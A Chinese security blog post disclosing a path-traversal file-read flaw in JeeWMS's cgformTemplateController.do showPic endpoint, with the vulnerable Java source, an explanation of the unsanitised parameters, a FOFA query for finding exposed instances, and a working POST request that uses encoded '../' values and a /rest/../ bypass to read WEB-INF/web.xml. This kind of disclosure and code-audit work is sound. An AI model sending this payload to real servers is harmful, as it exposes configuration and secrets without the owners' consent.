---
title: "JeeWMS cgformTemplateController.do 文件读取漏洞"
source: https://mrxn.net/jswz/JeeWMS-cgformTemplateController-showPic-fileread.html
asset_dir: assets/jeewms-cgformtemplatecontroller.do-文件读取漏洞
---

# JeeWMS cgformTemplateController.do 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/21 08:22
- 906浏览
- [0评论](#comment)
- 36分钟阅读

深入探索

SQL

服务器

文件系统

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS `cgformTemplateController.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取服务器上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

20250515（最新版本）

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

直接看 `showPic` 的实现部分 `src/main/java/org/jeecgframework/web/cgform/controller/template/CgformTemplateController.java`

```
    /**
     * 查看图片
     * @param request
     * @param code
     * @param path
     * @param response
     */
    @RequestMapping(params = "showPic")
    public void showPic(HttpServletRequest request,String code, String path,HttpServletResponse response){
        String defaultPath="default.jpg";
        String defaultCode="default/images/";
        //无图片情况
        if(path==null){
            path=defaultPath;
            code=defaultCode;
        }else{
            //临时图片
            if(code==null){
                code="temp/";
            }else{
                code+="/images/";
            }
        }
        FileInputStream fis = null;
        OutputStream out = null;
        response.setContentType("image/" + FileUtils.getExtend(path));
        try {
            out = response.getOutputStream();
            File file = new File(getUploadBasePath(request),code+path);
            if(!file.exists()||file.isDirectory()){
                file=new File(getUploadBasePath(request),defaultCode+defaultPath);
            }
            fis = new FileInputStream(file);
            byte[] b = new byte[fis.available()];
            fis.read(b);
            out.write(b);
            out.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (fis != null) {
                try {
                    fis.close();
                    out.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
```

再看下 `getUploadBasePath` 方法的实现

计算机服务器

```
//获取上传根路径
    private String getUploadBasePath(HttpServletRequest request){

//      String path=request.getSession().getServletContext().getRealPath("/WEB-INF/classes/online/template");

        ClassLoader classLoader = this.getClass().getClassLoader();  
        URL resource = classLoader.getResource("sysConfig.properties");
        String path = resource.getPath(); 
        path = path.substring(0,path.indexOf("sysConfig.properties"))+"online/template";
//      String path= this.getClass().getResource("/").getPath()+"online/template";

        path = path.replaceAll("%20", " ");//解决tomcat安装路径包含空格的问题
        return path;
    }
```

- 代码中直接将前端传入的 `code`、`path` 拼接到服务器文件系统路径上：  
  File file = new File(getUploadBasePath(request), code + path);
- 对 `code`、`path` 从未做任何白名单、黑名单或正规化处理，也未限制只能在某个子目录下读取。
- 这样一来，攻击者可以通过在 `code` 或 `path` 中携带“../”等路径穿越字符，访问任意文件。
- 虽然有 `if(!file.exists()||file.isDirectory())` 的判断，但只判断了文件是否存在或是否为目录，不会阻止“../”跳出预期目录。
- `getUploadBasePath` 返回的基础目录是 `/WEB-INF/classes/online/template`
- code=“../../../” → 拼接后变为 “../../../images/”
- path=“../web.xml”
- 合并后为 `/online/template/../../../images/../web.xml` 最终变为 `/WEB-INF/web.xml`

整体执行流程如下图所示

漏洞扫描服务

[![JeeWMS cgformTemplateController.do 文件读取漏洞](images/img-001-7a776329eff3.webp)](https://image.mrxn.net/d32f91cccb5044e8b9dac9406ed18f66.webp)

其次是根据 JeeWMS 框架的特点，访问URL也就是： `/jeewms/cgformTemplateController.do` (注意 jeewms 不一定存在)，结合前面的[权限绕过分析文章](https://mrxn.net/jswz/JeeWMS-commonController-upload-rce.html)，也可以是 `/jeewms/rest/../cgformTemplateController.do` 或者 `/rest/../cgformTemplateController.do`

# 漏洞复现

```
POST /rest/../cgformTemplateController.do?showPic HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded

code=%2E%2E%2F%2E%2E%2F%2E%2E%2F&path=%2E%2E%2Fweb.xml
```

成功读取到 `web.xml` 文件

[![JeeWMS cgformTemplateController.do 文件读取漏洞](images/img-002-c9e087d4ccfc.webp)](https://image.mrxn.net/3ce7d705bc934201a4dd04c5d4fc1e35.webp)

# 参考

- `https://gitee.com/erzhongxmu/JEEWMS/issues/I8YN90`
- `https://gitee.com/erzhongxmu/JEEWMS/issues/IC5FNV`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
